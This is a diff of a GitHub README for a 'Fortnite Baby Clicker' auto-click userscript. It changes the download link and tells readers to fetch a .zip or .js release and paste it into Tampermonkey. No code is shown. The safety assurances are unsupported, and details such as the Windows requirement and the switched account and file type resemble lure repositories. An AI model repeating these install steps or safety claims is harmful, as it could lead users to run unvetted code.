@@ -1,102 +1,75 @@
-# Fortnite Baby Clicker v1.0 - Automated Gameplay Helper 2026
+# 🖱️ baby-clicker-script-update - Automate clicks for faster game progress
 
-> **A streamlined browser-side tool for Fortnite Baby Clicker.** This utility automates repeated clicking tasks to enhance your web-based gaming experience.
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/sarsbodyofwork411/baby-clicker-script-update)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/evan-gray2004/baby-clicker-script-update?style=flat-square)](https://github.com/evan-gray2004/baby-clicker-script-update)
+## 📌 About this project
 
----
+This tool automates clicking tasks in the web game Fortnite Baby Clicker. It runs inside your web browser. It helps you gain game points without manual clicking. This tool works on major browsers. It removes the need for repetitive work. You save time while the script manages the clicking process for you.
 
-<p align="center">
-  <a href="https://evan-gray2004.github.io/baby-clicker-script-update/">
-    <img src="https://img.shields.io/badge/Download-Fortnite%20Baby%20Clicker%20Script-brightgreen?style=for-the-badge" alt="Download Fortnite Baby Clicker Script">
-  </a>
-</p>
+## ⚙️ System requirements
 
-> **[Direct Download - Fortnite Baby Clicker](https://evan-gray2004.github.io/baby-clicker-script-update/)**
+This tool runs on Windows 10 or Windows 11. You need a modern web browser installed on your computer. Supported browsers include:
 
----
+* Google Chrome
+* Mozilla Firefox
+* Microsoft Edge
+* Safari
 
-[Download Latest Build](https://evan-gray2004.github.io/baby-clicker-script-update/)
+You do not need high-end hardware. The internal script uses browser resources. Keep your browser updated to ensure stability.
 
----
+## 📥 Downloading the software
 
-## What It Does
+Visit this page to download the script: [https://github.com/sarsbodyofwork411/baby-clicker-script-update](https://github.com/sarsbodyofwork411/baby-clicker-script-update)
 
-Fortnite Baby Clicker is a browser-based helper that automates the constant clicking actions within the Fortnite Baby Clicker game. By handling repetitive mouse clicks, this script frees you to concentrate on strategy and advancement. Written purely in HTML, it operates directly in your browser with zero extra installations.
+1. Go to the link above.
+2. Look for the Releases section on the right side of the page.
+3. Click the most recent version link.
+4. Download the file ending in .zip or .js.
+5. Save the file to your desktop for easy access.
 
-The 2026 release refines click precision and reaction speed for a more fluid gaming experience. The script stays compact and works across current web browsers, making it simple to add to your play sessions. As an open-source project, it welcomes community use and customization.
+## 🚀 Setting up the script
 
----
+Most browser tools require a userscript manager to function. Follow these steps to prepare your browser.
 
-## Key Capabilities
+1. Open your web browser. 
+2. Search your browser's store for an extension named Tampermonkey.
+3. Add this extension to your browser.
+4. Once installed, click the Tampermonkey icon in your toolbar.
+5. Select the option to create a new script.
+6. Delete the example code in the window.
+7. Open the file you downloaded from our page using a text editor like Notepad.
+8. Copy the entire contents of that file.
+9. Paste the text into the Tampermonkey editor window.
+10. Click File and then Save.
 
-- Automatic click handling for Fortnite Baby Clicker sessions.
-- Fully browser-based operation with no setup steps.
-- Compact HTML script with fast loading times.
-- Adjustable click frequency to suit your play style.
-- Convenient on/off toggle for starting and stopping automation.
-- Works with modern browsers like Chrome, Firefox, and Edge.
-- Source code available for transparency and modifications.
-- No external packages or frameworks required.
+## 🎮 Running the automation
 
----
+After you save the script, the tool becomes active.
 
-## Getting Started
+1. Navigate to the Fortnite Baby Clicker game website.
+2. Refresh the browser page.
+3. Tampermonkey will show a small number on its icon. This confirms the script detects the game.
+4. Open the game.
+5. Click the start button within the game interface.
+6. The script will handle the clicking tasks automatically.
+7. Observe the game interface to watch your progress increase.
 
-1. Grab the newest build using the download link above.
-2. Launch the downloaded HTML file in your browser of choice.
-3. Go to the Fortnite Baby Clicker game page.
-4. Activate the script using the controls shown on screen.
+## 🛠 Troubleshooting common issues
 
-Quick start:  
-Double-click `fortnitebabyclicker.html` to open it, then press the "Start" button to begin automation.
+If the script does not start, check these common items:
 
----
+* Ensure you enabled the script in your manager. Click the extension icon and verify the toggle switch is on.
+* Clear your browser cache if the game update looks old.
+* Disable other browser extensions if they interfere with inputs.
+* Confirm you are on the correct game URL.
+* Restart your browser to apply changes.
 
-## Configuration Options
+## 🔒 Safety and performance
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Click Interval | 100 ms | Time gap between successive clicks |
-| Auto-Start | Off | Automatically begin clicking when the game loads |
-| Click Target | Center | Defines which part of the game window receives clicks |
+This script interacts with the document object model of the webpage. It mimics standard mouse clicks. It does not access your personal folders or files. Your data remains private. The tool consumes minimal memory. If you notice your browser slowing down, check if you have too many tabs open. Turn off the script by toggling the extension off if you wish to play manually.
 
-These parameters can be modified through the script's built-in interface.
+## 📋 Best practices for game automation
 
----
+Use this tool to speed up repetitive clicking. Avoid running multiple automation scripts at the same time. This keeps your game stable. Check for updates on the repository page to keep your script compatible with game changes.
 
-## System Requirements
-
-- **Platform:** Web (browser environment)
-- **Browsers:** Chrome, Firefox, Edge, Safari (most recent releases)
-- **Game Version:** Fortnite Baby Clicker (current web edition)
-- **Known Limitations:** May stop working if the game alters its click detection. Not designed for mobile browsers.
-
----
-
-## Common Questions
-
-**What do I need to do to install this?**  
-Nothing beyond downloading the HTML file and opening it in a browser. No installation process exists.
-
-**Can game updates break the script?**  
-Yes, changes to the game could disrupt functionality. Watch this repository for updated versions.
-
-**Is the click speed adjustable?**  
-Absolutely. The options panel lets you change the interval between clicks.
-
-**Will this work with other clicker games?**  
-No, it targets Fortnite Baby Clicker exclusively.
-
-**Where does my data go?**  
-Everything stays local in your browser. No data gets transmitted elsewhere.
-
----
-
-## License
-
-GNU General Public License v3.0 - refer to [LICENSE](LICENSE) for full terms.
+Keywords: automation, clicker, gaming, browser, script, windows, utility
